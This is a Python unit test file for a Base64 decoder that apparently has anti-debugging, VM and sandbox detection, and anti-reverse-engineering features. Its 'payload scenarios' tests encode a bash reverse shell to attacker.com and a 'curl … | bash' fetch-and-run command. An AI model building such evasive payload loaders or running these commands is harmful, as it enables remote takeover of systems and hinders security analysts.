#!/usr/bin/env python3
"""
Comprehensive test suite for hardened Base64 decoder with anti-analysis protection
Tests all security features and decoding functionality
"""

import unittest
import base64
import sys
import os
from base64_hardened_decoder import (
    HardenedBase64Decoder,
    AntiAnalysisEnvironment,
    AntiTamperingProtection,
    AntiReversEngineering,
    RateLimitingObfuscation,
    EnvironmentAwarenessProtection,
    hardened_decode,
    create_protected_decoder,
)


class TestAntiAnalysisEnvironment(unittest.TestCase):
    """Test anti-analysis detection capabilities"""

    def setUp(self):
        self.anti_analysis = AntiAnalysisEnvironment()

    def test_debugger_detection(self):
        """Test debugger detection"""
        # This test will pass in normal environments
        # In a debugger, it should detect it
        result = self.anti_analysis.detect_debugger()
        self.assertIsInstance(result, bool)

    def test_vm_detection(self):
        """Test VM detection"""
        result = self.anti_analysis.detect_virtual_machine()
        self.assertIsInstance(result, bool)

    def test_sandbox_detection(self):
        """Test sandbox detection"""
        result = self.anti_analysis.detect_sandbox()
        self.assertIsInstance(result, bool)

    def test_instrumentation_detection(self):
        """Test instrumentation detection"""
        result = self.anti_analysis.detect_instrumentation()
        self.assertIsInstance(result, bool)


class TestAntiTamperingProtection(unittest.TestCase):
    """Test anti-tampering features"""

    def setUp(self):
        self.protection = AntiTamperingProtection()

    def test_integrity_hash_calculation(self):
        """Test hash calculation"""
        data = b"test data"
        hash1 = self.protection.calculate_integrity_hash(data)
        hash2 = self.protection.calculate_integrity_hash(data)

        # Same data should produce same hash
        self.assertEqual(hash1, hash2)
        # Hash should be hex string
        self.assertTrue(all(c in '0123456789abcdef' for c in hash1))
        # SHA-256 hash should be 64 chars
        self.assertEqual(len(hash1), 64)

    def test_integrity_verification(self):
        """Test integrity verification"""
        data = b"test data"
        hash_val = self.protection.calculate_integrity_hash(data)

        # Should verify correct hash
        self.assertTrue(self.protection.verify_integrity(data, hash_val))

        # Should reject wrong hash
        wrong_hash = "0" * 64
        self.assertFalse(self.protection.verify_integrity(data, wrong_hash))

    def test_constant_time_comparison(self):
        """Test constant-time string comparison"""
        str1 = "test123"
        str2 = "test123"
        str3 = "test456"

        # Same strings should match
        self.assertTrue(self.protection._constant_time_compare(str1, str2))

        # Different strings should not match
        self.assertFalse(self.protection._constant_time_compare(str1, str3))

        # Different lengths should not match
        self.assertFalse(self.protection._constant_time_compare("short", "much_longer"))

    def test_runtime_modification_detection(self):
        """Test runtime modification detection"""
        code = "original code"

        # First check should establish baseline
        result1 = self.protection.detect_runtime_modification(code)
        self.assertFalse(result1)

        # Same code should not be detected as modified
        result2 = self.protection.detect_runtime_modification(code)
        self.assertFalse(result2)

        # Modified code should be detected
        modified_code = "modified code"
        result3 = self.protection.detect_runtime_modification(modified_code)
        self.assertTrue(result3)


class TestAntiReverseEngineering(unittest.TestCase):
    """Test anti-reverse engineering features"""

    def setUp(self):
        self.anti_re = AntiReversEngineering()

    def test_obfuscated_decode_path(self):
        """Test obfuscated decoding path"""
        message = "test message"
        encoded = base64.b64encode(message.encode()).decode()

        result = self.anti_re.obfuscate_decode_path(encoded)
        self.assertIsInstance(result, bytes)
        # Result should be decodable
        self.assertEqual(result.decode(), message)

    def test_junk_code_execution(self):
        """Test junk code execution"""
        result = self.anti_re.add_junk_code_execution()
        # Should always return True
        self.assertTrue(result)

    def test_polymorphic_decode_engine(self):
        """Test polymorphic decoding"""
        message = "polymorphic test"
        encoded = base64.b64encode(message.encode()).decode()

        result = self.anti_re.polymorphic_decode_engine(encoded)
        self.assertEqual(result.decode(), message)

        # Test with various formats
        encoded_with_newlines = encoded + "\n"
        result2 = self.anti_re.polymorphic_decode_engine(encoded_with_newlines)
        self.assertEqual(result2.decode(), message)

        encoded_with_spaces = " " + encoded + " "
        result3 = self.anti_re.polymorphic_decode_engine(encoded_with_spaces)
        self.assertEqual(result3.decode(), message)


class TestRateLimitingObfuscation(unittest.TestCase):
    """Test rate limiting and timing obfuscation"""

    def setUp(self):
        self.rate_limiter = RateLimitingObfuscation(min_delay=0.001, max_delay=0.01)

    def test_stochastic_delay(self):
        """Test stochastic delay execution"""
        import time
        # Should not raise exception
        start = time.time()
        self.rate_limiter.add_stochastic_delay()
        elapsed = time.time() - start
        # Should execute quickly (delay is probabilistic)
        self.assertLess(elapsed, 0.5)

    def test_analysis_speed_detection(self):
        """Test rapid analysis detection"""
        # First call should return False
        result1 = self.rate_limiter.detect_analysis_speed()
        self.assertFalse(result1)

        # Rapid successive calls might trigger detection
        # (depends on timing)
        results = []
        for _ in range(100):
            results.append(self.rate_limiter.detect_analysis_speed())

        # Should have recorded some call times
        self.assertTrue(len(self.rate_limiter._call_times) > 0)


class TestEnvironmentAwarenessProtection(unittest.TestCase):
    """Test environment awareness features"""

    def setUp(self):
        self.env_awareness = EnvironmentAwarenessProtection()

    def test_get_execution_context(self):
        """Test execution context detection"""
        context = self.env_awareness.get_execution_context()

        # Should have all expected keys
        expected_keys = [
            'is_interactive',
            'has_argv',
            'is_main_module',
            'python_optimization',
            'has_debugger',
        ]

        for key in expected_keys:
            self.assertIn(key, context)
            self.assertIsNotNone(context[key])

    def test_execution_context_values(self):
        """Test execution context value types"""
        context = self.env_awareness.get_execution_context()

        self.assertIsInstance(context['is_interactive'], bool)
        self.assertIsInstance(context['has_argv'], bool)
        self.assertIsInstance(context['is_main_module'], bool)
        self.assertIsInstance(context['python_optimization'], int)
        self.assertIsInstance(context['has_debugger'], bool)


class TestHardenedBase64Decoder(unittest.TestCase):
    """Test main hardened decoder functionality"""

    def setUp(self):
        self.decoder = HardenedBase64Decoder(
            enable_anti_analysis=True,
            strict_mode=False
        )

    def test_basic_decode(self):
        """Test basic Base64 decoding"""
        message = "Hello, World!"
        encoded = base64.b64encode(message.encode()).decode()

        decoded = self.decoder.decode(encoded)
        self.assertEqual(decoded, message)

    def test_decode_empty_string(self):
        """Test decoding empty string raises error"""
        with self.assertRaises(ValueError):
            self.decoder.decode("")

    def test_decode_invalid_input_type(self):
        """Test non-string input raises error"""
        with self.assertRaises(ValueError):
            self.decoder.decode(b"bytes")

    def test_decode_with_integrity_check(self):
        """Test decoding with integrity verification"""
        message = "Integrity test"
        encoded = base64.b64encode(message.encode()).decode()
        integrity_hash = self.decoder.anti_tampering.calculate_integrity_hash(
            encoded.encode()
        )

        # Should succeed with correct hash
        decoded = self.decoder.decode(encoded, integrity_hash)
        self.assertEqual(decoded, message)

        # Should fail with wrong hash
        wrong_hash = "0" * 64
        with self.assertRaises(ValueError):
            self.decoder.decode(encoded, wrong_hash)

    def test_decode_with_validation(self):
        """Test decode with length validation"""
        message = "validation test"
        encoded = base64.b64encode(message.encode()).decode()

        # Should succeed with correct length
        decoded = self.decoder.decode_with_validation(
            encoded,
            expected_length=len(message)
        )
        self.assertEqual(decoded, message)

        # Should fail with wrong length
        with self.assertRaises(ValueError):
            self.decoder.decode_with_validation(
                encoded,
                expected_length=len(message) + 1
            )

    def test_batch_decode(self):
        """Test batch decoding multiple messages"""
        messages = ["msg1", "msg2", "msg3"]
        encoded_messages = [
            base64.b64encode(m.encode()).decode() for m in messages
        ]

        decoded_messages = self.decoder.batch_decode(encoded_messages)

        self.assertEqual(len(decoded_messages), len(messages))
        for original, decoded in zip(messages, decoded_messages):
            self.assertEqual(decoded, original)

    def test_get_security_status(self):
        """Test security status reporting"""
        status = self.decoder.get_security_status()

        # Should have all expected keys
        expected_keys = [
            'anti_analysis_enabled',
            'strict_mode',
            'total_calls',
            'suspicious_activity_count',
            'current_threats',
            'execution_context',
        ]

        for key in expected_keys:
            self.assertIn(key, status)

        self.assertTrue(status['anti_analysis_enabled'])
        self.assertFalse(status['strict_mode'])
        self.assertIsInstance(status['current_threats'], list)

    def test_call_tracking(self):
        """Test that decoder tracks function calls"""
        initial_calls = self.decoder._call_count

        message = "tracking test"
        encoded = base64.b64encode(message.encode()).decode()

        self.decoder.decode(encoded)
        self.assertEqual(self.decoder._call_count, initial_calls + 1)

        self.decoder.decode(encoded)
        self.assertEqual(self.decoder._call_count, initial_calls + 2)

    def test_polymorphic_decoding_variants(self):
        """Test that polymorphic decoding handles different formats"""
        message = "test message"
        encoded = base64.b64encode(message.encode()).decode()

        # Test standard format
        decoded1 = self.decoder.decode(encoded)
        self.assertEqual(decoded1, message)

        # Test with padding
        encoded_padded = encoded.ljust(len(encoded) + 4, '=')
        decoded2 = self.decoder.decode(encoded_padded)
        self.assertEqual(decoded2, message)


class TestConvenienceFunctions(unittest.TestCase):
    """Test convenience functions"""

    def test_hardened_decode_function(self):
        """Test hardened_decode convenience function"""
        message = "convenience test"
        encoded = base64.b64encode(message.encode()).decode()

        decoded = hardened_decode(encoded)
        self.assertEqual(decoded, message)

    def test_create_protected_decoder_function(self):
        """Test create_protected_decoder factory function"""
        decoder = create_protected_decoder(strict_mode=False)
        self.assertIsInstance(decoder, HardenedBase64Decoder)
        self.assertTrue(decoder.enable_anti_analysis)
        self.assertFalse(decoder.strict_mode)

    def test_create_protected_decoder_strict(self):
        """Test factory with strict mode"""
        decoder = create_protected_decoder(strict_mode=True)
        self.assertTrue(decoder.strict_mode)


class TestPayloadSecenarios(unittest.TestCase):
    """Test real-world payload scenarios"""

    def setUp(self):
        self.decoder = HardenedBase64Decoder(
            enable_anti_analysis=True,
            strict_mode=False
        )

    def test_powershell_command_decoding(self):
        """Test decoding PowerShell command payload"""
        ps_command = "powershell.exe -NoProfile -WindowStyle Hidden -Command 'Write-Host Test'"
        encoded = base64.b64encode(ps_command.encode()).decode()

        decoded = self.decoder.decode(encoded)
        self.assertEqual(decoded, ps_command)

    def test_cmd_command_decoding(self):
        """Test decoding Windows cmd command"""
        cmd_command = "cmd /c ipconfig /all"
        encoded = base64.b64encode(cmd_command.encode()).decode()

        decoded = self.decoder.decode(encoded)
        self.assertEqual(decoded, cmd_command)

    def test_bash_command_decoding(self):
        """Test decoding bash command"""
        bash_command = "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
        encoded = base64.b64encode(bash_command.encode()).decode()

        decoded = self.decoder.decode(encoded)
        self.assertEqual(decoded, bash_command)

    def test_multiline_payload_decoding(self):
        """Test decoding multiline payload"""
        payload = """#!/bin/bash
echo "multiline payload"
curl http://attacker.com/shell.sh | bash
"""
        encoded = base64.b64encode(payload.encode()).decode()

        decoded = self.decoder.decode(encoded)
        self.assertEqual(decoded, payload)


class TestStrictMode(unittest.TestCase):
    """Test strict mode behavior"""

    def test_strict_mode_enabled(self):
        """Test decoder with strict mode enabled"""
        decoder = HardenedBase64Decoder(
            enable_anti_analysis=True,
            strict_mode=True
        )

        message = "strict test"
        encoded = base64.b64encode(message.encode()).decode()

        # May raise in strict mode if threats detected
        # but should still decode if no threats
        try:
            decoded = decoder.decode(encoded)
            self.assertEqual(decoded, message)
        except RuntimeError:
            # Expected in strict mode with detected threats
            pass

    def test_strict_mode_disabled(self):
        """Test decoder with strict mode disabled (default)"""
        decoder = HardenedBase64Decoder(
            enable_anti_analysis=True,
            strict_mode=False
        )

        message = "non-strict test"
        encoded = base64.b64encode(message.encode()).decode()

        # Should always decode even with detected threats
        decoded = decoder.decode(encoded)
        self.assertEqual(decoded, message)


class TestPerformance(unittest.TestCase):
    """Test performance characteristics"""

    def setUp(self):
        self.decoder = HardenedBase64Decoder(
            enable_anti_analysis=True,
            strict_mode=False
        )

    def test_decode_performance(self):
        """Test decoding performance is acceptable"""
        import time

        message = "performance test " * 100  # 1700+ chars
        encoded = base64.b64encode(message.encode()).decode()

        start = time.time()
        for _ in range(10):
            self.decoder.decode(encoded)
        elapsed = time.time() - start

        # Should complete in reasonable time (< 2 seconds for 10 iterations)
        self.assertLess(elapsed, 2.0)

    def test_batch_decode_performance(self):
        """Test batch decoding performance"""
        import time

        messages = ["test" * 10] * 50
        encoded_messages = [
            base64.b64encode(m.encode()).decode() for m in messages
        ]

        start = time.time()
        self.decoder.batch_decode(encoded_messages)
        elapsed = time.time() - start

        # Should complete quickly
        self.assertLess(elapsed, 2.0)


def run_tests():
    """Run all tests with detailed output"""
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()

    # Add all test classes
    suite.addTests(loader.loadTestsFromTestCase(TestAntiAnalysisEnvironment))
    suite.addTests(loader.loadTestsFromTestCase(TestAntiTamperingProtection))
    suite.addTests(loader.loadTestsFromTestCase(TestAntiReverseEngineering))
    suite.addTests(loader.loadTestsFromTestCase(TestRateLimitingObfuscation))
    suite.addTests(loader.loadTestsFromTestCase(TestEnvironmentAwarenessProtection))
    suite.addTests(loader.loadTestsFromTestCase(TestHardenedBase64Decoder))
    suite.addTests(loader.loadTestsFromTestCase(TestConvenienceFunctions))
    suite.addTests(loader.loadTestsFromTestCase(TestPayloadSecenarios))
    suite.addTests(loader.loadTestsFromTestCase(TestStrictMode))
    suite.addTests(loader.loadTestsFromTestCase(TestPerformance))

    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    return result.wasSuccessful()


if __name__ == "__main__":
    success = run_tests()
    sys.exit(0 if success else 1)
